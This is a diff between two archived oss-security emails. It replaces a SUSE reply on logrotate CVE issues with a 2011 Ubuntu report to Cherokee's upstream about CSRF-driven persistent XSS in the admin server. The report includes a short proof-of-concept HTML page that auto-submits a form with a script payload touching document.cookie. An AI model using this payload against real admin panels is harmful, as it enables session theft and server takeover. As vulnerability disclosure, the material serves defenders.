@@ -1,45 +1,61 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/03/08/5
-Message-Id: <201103080859.03319.ludwig.nussel@suse.de>
-Date: Tue, 8 Mar 2011 08:59:03 +0100
-From: Ludwig Nussel <ludwig.nussel@...e.de>
-To: oss-security@...ts.openwall.com
-Cc: "Steven M. Christey" <coley@...us.mitre.org>, Stefan Fritsch <sf@...itsch.de>, Florian Zumbiehl <florz@...rz.de>, Petr Uzel <petr.uzel@...e.cz>, Thomas Biege <thomas@...e.de>, Jan Kaluža <jkaluza@...hat.com>
-Subject: Re: CVE Request -- logrotate -- nine issues
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/06/03/6
+Message-ID: <1307116875.8176.11.camel@localhost>
+Date: Fri, 03 Jun 2011 11:01:15 -0500
+From: Jamie Strandboge <jamie@...onical.com>
+To: Alvaro Lopez Ortega <alvaro@...ality.com>
+Cc: oss-security@...ts.openwall.com
+Subject: Security issue in cherokee
 Content-Type: text/plain; charset=utf-8
 
-Josh Bressers wrote:
-> [...]
-> It seems there is now a consensus on this (at least that's how I'm reading
-> it). Here is what I plan to do with CVE ids unless someone speaks up.
-> 
-> As best as I can tell, logrotate only needs a CVE id for this:
-> 
->     8) Issue #8: logrotate: TOCTOU race condition by creation of new files
->        (between opening the file and moment, final permissions have been
->        applied) [information disclosure]
-> 
+A security bug was reported against cherokee in Ubuntu. You are being
+emailed as the upstream contact. Please keep oss-security[1] CC'd for
+any updates on this issue.
 
-Ack.
- 
-> We then will need to assign IDs for various broken uses of /var/log (If
-> someone has a list of the currently known ones, please pass it along)
+This issue should be considered public, but has not yet been assigned a
+CVE. Once a CVE is assigned, please mention it in any changelogs.
 
-AFAICS on openSUSE Factory we have
-cobbler
-inn
-safte-monitor
-uucp
+Details from the public bug follow:
+https://launchpad.net/bugs/784632
 
-service owned log dirs without logrotate:
-cups
-horde
+From the reporter:
+----
+The cherokee admin server is vulnerable to csrf.
 
-cu
-Ludwig
+Using csrf it is possible to produce a persistent xss in several pages -
+including the 'status' page via the 'nickname field' of a vserver.
+An example of this is the following:
+
+<html>
+<body>
+ <form action="http://127.0.0.1:9090/vserver/apply" method="post"
+id="xssform">
+ <input type="text" name="tmp!new_droot" value='/var/www/'></input>
+ <input type="text" name="tmp!new_nick" value='" onselect=alert(1)
+autofocus> <embed src="javascript:alert(document.cookie)">'></input>
+</form>
+<script>document.getElementById("xssform").submit();</script>
+</body>
+
+A Worst case scenario could be something like the following:
+If a user is logged in and the cherokee admin server is running on
+localhost:9090 then if they visit a $bad page - the bad page may be able
+to send requests to the server so as to reconfigure it to:
+
+1. run as root
+2. the logging of error(or access) will run a command ...
+----
+
+Thanks in advance for your cooperation in coordinating a fix for this
+issue,
+
+Jamie Strandboge
+
+[1] oss-security@...ts.openwall.com is a public mailing list for
+    people to collaborate on security vulnerabilities and coordinate
+    security updates.
 
 -- 
- (o_   Ludwig Nussel
- //\
- V_/_  http://www.suse.de/
-SUSE LINUX Products GmbH, GF: Markus Rex, HRB 16746 (AG Nuernberg)
+Jamie Strandboge             | http://www.canonical.com
+
+Download attachment "signature.asc" of type "application/pgp-signature" (837 bytes)
